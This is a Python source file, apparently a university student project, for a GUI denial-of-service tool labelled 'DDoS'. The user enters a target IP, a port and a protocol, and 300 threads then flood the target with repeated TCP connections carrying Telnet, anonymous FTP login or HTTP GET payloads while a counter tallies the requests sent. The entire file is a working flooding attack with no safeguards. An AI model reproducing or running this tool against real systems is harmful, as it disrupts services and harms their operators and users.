import socket
import tkinter as tk
from tkinter import messagebox, scrolledtext
from threading import Thread, Lock
from PIL import Image, ImageTk
import time

inundando = False
contador = 0
contador_lock = Lock()

def paquetetelnet():
    return b"EHLO\r\n"

def paqueteftp():
    return b"USER anonymous\r\nPASS anonymous\r\n"

def paquetehttp(ip_destino):
    http_request = f"GET / HTTP/1.1\r\nHost: {ip_destino}\r\n\r\n"
    return http_request.encode('utf-8')

def enviar_paquetes(ip_destino, puerto, tipo):
    global inundando
    global contador
    if tipo == 'TELNET':
        while inundando:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip_destino, puerto))
                s.send(paquetetelnet())
                with contador_lock:
                    contador += 1
                textosalida.insert(tk.END, f"Comando Telnet enviado a {ip_destino}:{puerto}\n")
                textosalida.see(tk.END)
            except Exception as e:
                textosalida.insert(tk.END, f"Error al conectar Telnet a {ip_destino}:{puerto} - {str(e)}\n")
                textosalida.see(tk.END)
                time.sleep(1)
    elif tipo == 'FTP':
        while inundando:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip_destino, puerto))
                s.send(paqueteftp())
                with contador_lock:
                    contador += 1
                textosalida.insert(tk.END, f"Comandos FTP enviados a {ip_destino}:{puerto}\n")
                textosalida.see(tk.END)
            except Exception as e:
                textosalida.insert(tk.END, f"Error al conectar FTP a {ip_destino}:{puerto} - {str(e)}\n")
                textosalida.see(tk.END)
                time.sleep(1)
    elif tipo == 'HTTP':
        while inundando:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip_destino, puerto))
                http_request = paquetehttp(ip_destino)
                s.send(http_request)
                with contador_lock:
                    contador += 1
                s.close()
                textosalida.insert(tk.END, f"Solicitud HTTP enviada a {ip_destino}:{puerto}\n")
                textosalida.see(tk.END)
            except Exception as e:
                textosalida.insert(tk.END, f"Error al enviar solicitud HTTP: {str(e)}\n")
                textosalida.see(tk.END)
                time.sleep(1)

def contadoractualizado():
    while inundando:
        contalabel.config(text=f"Solicitudes enviadas: {contador}")
        contalabel.update()
        time.sleep(0.05)

def ejecutar(ip_destino, puerto, tipo):
    global inundando
    global contador
    contador = 0
    inundando = True
    textosalida.delete(1.0, tk.END)  
    textosalida.insert(tk.END, f"Iniciando inundación a {ip_destino}:{puerto} usando {tipo}\n\n")
    Thread(target=contadoractualizado).start()
    for _ in range(300):
        Thread(target=enviar_paquetes, args=(ip_destino, puerto, tipo), daemon=True).start()

def detener():
    global inundando
    inundando = False
    textosalida.insert(tk.END, "Inundación detenida.\n")
    textosalida.see(tk.END)
    contalabel.config(text=f"Solicitudes enviadas al servidor: {contador}")

def datos():
    ip_destino = ip.get()
    puerto = port.get()
    tipo = tipo_ataque.get() 
    if ip_destino and puerto:
        try:
            puerto_int = int(puerto)
            if 1 <= puerto_int <= 65535:
                Thread(target=ejecutar, args=(ip_destino, puerto_int, tipo)).start()
            else:
                messagebox.showwarning("El puerto debe estar entre 1 y 65535.")
        except ValueError:
            messagebox.showwarning("Ingresar un puerto válido.")
    else:
        messagebox.showwarning("Completar ambas casillas.")

ventana = tk.Tk()
ventana.title("DDoS")
ventana.geometry("500x500")
ventana.configure(bg="white")

imagen = Image.open("Universidad_de_Lima_logo.png")
imagen = imagen.resize((50, 50), Image.LANCZOS)
imagen_tk = ImageTk.PhotoImage(imagen)
label_imagen = tk.Label(ventana, image=imagen_tk, bg="white")
label_imagen.place(x=10, y=10)

tk.Label(ventana, text="IP de destino:", bg="white", fg="orange", font=("Arial", 10)).pack(pady=5)
ip = tk.Entry(ventana)
ip.pack()

tk.Label(ventana, text="Puerto:", bg="white", fg="orange", font=("Arial", 10)).pack(pady=5)
port = tk.Entry(ventana)
port.pack()

tk.Label(ventana, text="Tipo de ataque:", bg="white", fg="orange", font=("Arial", 10)).pack(pady=5)
tipo_ataque = tk.StringVar(value='TELNET') 
tk.Radiobutton(ventana, text="TELNET", variable=tipo_ataque, value='TELNET', bg="white", fg="orange").pack(anchor=tk.W)
tk.Radiobutton(ventana, text="FTP", variable=tipo_ataque, value='FTP', bg="white", fg="orange").pack(anchor=tk.W)
tk.Radiobutton(ventana, text="HTTP", variable=tipo_ataque, value='HTTP', bg="white", fg="orange").pack(anchor=tk.W)

boton_ejecutar = tk.Button(ventana, text="Ejecutar", command=datos, bg="orange", fg="white")
boton_ejecutar.pack(pady=10)

boton_detener = tk.Button(ventana, text="Detener", command=detener, bg="orange", fg="white")
boton_detener.pack(pady=10)

contalabel = tk.Label(ventana, text="Solicitudes enviadas: 0", bg="white", fg="orange", font=("Arial", 10))
contalabel.pack(pady=10)

textosalida = scrolledtext.ScrolledText(ventana, height=15, width=60, bg="white", fg="black")
textosalida.pack(pady=10)

ventana.mainloop()
